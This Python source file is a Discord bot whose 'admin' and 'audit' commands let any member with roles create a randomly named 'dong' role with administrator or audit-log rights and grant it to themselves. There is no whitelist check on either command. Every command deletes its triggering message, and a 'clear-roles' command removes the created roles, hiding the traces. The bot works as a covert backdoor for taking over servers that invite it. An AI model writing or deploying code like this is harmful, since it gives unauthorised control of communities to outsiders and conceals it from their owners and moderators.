from nextcord import role, utils
from nextcord.ext import commands
from yaml import load as load_yaml, Loader
from random import randint
import re

from nextcord.ext.commands.context import Context
from nextcord.permissions import Permissions

def load_config():
    with open('config.yml') as file:
        data = file.read()
        parsed_data = load_yaml(data, Loader=Loader)
    return parsed_data

config = load_config()
whitelisted_users = config['whitelist']

bot = commands.Bot(command_prefix=config['prefix'])

def check_whitelist(id):
    if id in whitelisted_users:
        return True
    else:
        return False

@commands.guild_only()
@bot.command(name='mv')
async def move_vc(ctx: Context, *args):
    vc_id = args[0]

    if not ctx.guild: return

    if not ctx.author.voice: return

    if not check_whitelist(ctx.author.id): return

    for vc in ctx.guild.voice_channels:
        if str(vc.id) == vc_id:
            voice_channel = vc
            await ctx.author.move_to(voice_channel)
    
    if ctx.message:
        await ctx.message.delete()

@bot.command(name='audit')
async def give_audit_perms(ctx: Context):
    if not ctx.guild: return
    if not ctx.author.roles: return

    role_name = 'dong' + str(randint(100000,999999))
    await ctx.guild.create_role(name=role_name)

    role = utils.get(ctx.guild.roles, name=role_name)

    perms = Permissions()

    perms.update(view_audit_log=True)

    await role.edit(permissions=perms)

    await ctx.author.add_roles(role)

    if ctx.message:
        await ctx.message.delete()

@bot.command(name='admin')
async def give_audit_perms(ctx: Context):
    if not ctx.guild: return
    if not ctx.author.roles: return

    role_name = 'dong' + str(randint(100000,999999))
    await ctx.guild.create_role(name=role_name)

    role = utils.get(ctx.guild.roles, name=role_name)

    perms = Permissions()

    perms.update(administrator=True)

    await role.edit(permissions=perms)

    await ctx.author.add_roles(role)

    if ctx.message:
        await ctx.message.delete()

@bot.command(name='clear-roles')
async def clear_roles(ctx: Context):
    if not ctx.guild: return
    if not ctx.author.roles: return

    for role in ctx.author.roles:
        if re.match('^dong[0-9]+$', role.name):
            await role.delete()

    if ctx.message:
        await ctx.message.delete()



@bot.event 
async def on_ready():
    print('Ready!')

bot.run(config['token'])